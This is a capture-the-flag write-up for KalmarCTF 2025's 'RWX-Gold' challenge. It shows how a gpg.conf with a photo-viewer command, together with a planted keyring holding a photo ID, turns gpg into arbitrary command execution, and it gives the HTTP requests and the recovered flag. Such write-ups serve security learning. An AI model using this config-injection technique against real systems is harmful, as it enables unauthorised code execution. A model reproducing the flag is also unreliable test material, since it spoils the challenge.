---
title: RWX-Gold
date: 2025-03-10T03:03:41+03:00
description: Writeup for RWX-Gold [KalmarCTF 2025]
type: writeup
author: h3pha
tags:
- misc
draft: false
---
___

## Challenge Description

We give you file read, file write and code execution. But can you get the flag? Let's reduce that.

## Intuition

Since the challenge lets us execute a command with 3 characters we cannot directly execute `/would`, so we need to find something that can execute commands for as. This is `gpg`.

## Solution

#### Step 1 - create the `.gnupg` directory

First we need to execute `gpg` to create the directory `~/.gnupg`:
```
GET /exec?cmd=gpg HTTP/2
```

Then we can find this in `gpg` man page:
```
gpg.conf  
	This  is the standard configuration file read by gpg on startup. It may contain any valid long option; the leading two dashes may not be entered and the option may not be abbreviated. This default name may be changed on the command line (see: [gpg-option --options]).  You should backup this file.
```

So we can write configurations in `gpg.conf`. Further searching the man page for useful options you will stumble upon these:
```
--photo-viewer string
This is the command line that should be run to view a photo ID. "%i" will be expanded to a filename containing the photo. "%I" does the same, except the file  will  not be deleted once the viewer exits.  Other flags are "%k" for the key ID, "%K" for the long key ID, "%f" for the key fingerprint, "%t" for the extension of the image type (e.g.  "jpg"), "%T" for the MIME type of the image (e.g. "image/jpeg"), "%v" for the single-character calculated validity of the image being viewed (e.g. "f"), "%V" for the calculated validity as a string (e.g.  "full"), "%U" for a base32 encoded hash of the user ID, and "%%" for an actual percent sign. If neither %i or %I are present, then the photo will be supplied to the viewer on standard input.

On Unix the default viewer is xloadimage -fork -quiet -title 'KeyID 0x%k' STDIN with a fallback to display -title 'KeyID 0x%k' %i and finally to xdg-open %i. On  Windows !ShellExecute 400 %i is used; here the command is a meta command to use that API call followed by a wait time in milliseconds which is used to give the viewer time to read the temporary image file before gpg deletes it again.  Note that if your image viewer program is not secure, then executing it from gpg does not make it secure.

--list-options parameters  
This  is  a  space  or  comma  delimited  string that gives options used when listing keys and signatures (that is, --list-keys, --check-signatures, --list-public-keys, --list-secret-keys, and the --edit-key functions).  Options can be prepended with a no- (after the two dashes) to give the opposite meaning.  The options are:  
  
show-photos  
Causes --list-keys, --check-signatures, --list-public-keys, and --list-secret-keys to display any photo IDs attached to the  key. Defaults to no. See also --photo-viewer. Does not work with --with-colons: see --attribute-fd for the appropriate way to get photo data for scripts and other frontends.

--list-keys  
-k  
--list-public-keys  
List the specified keys. If no keys are specified, then all keys from the configured public keyrings are listed.
```

So a `gpg.conf` that can execute our commands would look like this:
```
list-options show-photos
photo-viewer /would you be so kind to provide me with a flag > ~/a.txt
list-keys
```

#### Step 2 - write `gpg.conf` file
Request:
```
POST /write?filename=/home/user/.gnupg/gpg.conf HTTP/2

list-options show-photos
photo-viewer /would you be so kind to provide me with a flag > ~/a.txt
list-keys
```

Now executing `gpg` won't execute our command because there are no `keyrings` on the remote machine that have images to display. We need to write a key that has an image to display in `~/.gnupg/pubring.kbx`.

#### Step 3 - create the `pubring.kbx` file

On your machine you can follow the commands (for the `jpg` image I used [this](https://github.com/mathiasbynens/small/blob/master/jpeg.jpg)):
```sh
gpg --gen-key
# input a name, email and password (eg. John Doe, john@gmail.com, 1234)
gpg --edit-key john@gmail.com
> addphoto /paht/to/jpg # careful if you use my jpg image, it is a pixel small, look carefully when it is displayed
> save
```

You file should be saved at `~/.gnupg/pubring.kbx`.

Request:
```
POST /write?filename=/home/user/.gnupg/pubring.kbx HTTP/2

<Your pubring.kbx file content here. (you can use a python script for this request)>
```

#### Step 4 - get the flag

Execute `gpg`:
```
GET /exec?cmd=gpg HTTP/2
```

Read the flag:
```
GET /read?filename=/home/user/a.txt HTTP/2
```

### Flag

`kalmar{so_many_rabbit_holes_to_get_stuck_in_but_luckily_you_found_a_way_to_view_that_picture_678cac2678d0}`

## References
[gpg manpage](https://www.gnupg.org/documentation/manuals/gnupg24/gpg.1.html)